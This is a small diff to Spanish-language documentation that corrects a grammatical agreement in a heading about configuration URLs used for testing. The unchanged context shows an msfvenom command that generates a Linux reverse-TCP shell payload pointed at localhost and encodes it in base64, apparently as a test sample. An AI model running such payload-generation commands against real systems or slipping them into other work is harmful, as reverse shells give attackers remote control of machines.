@@ -135,7 +135,7 @@ Generar un payload de prueba:
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw | base64 -w0
 ```
 
-## URLs de configuración empleados para las pruebas
+## URLs de configuración empleadas para las pruebas
 
 | Recurso | URL |
 |---|---|
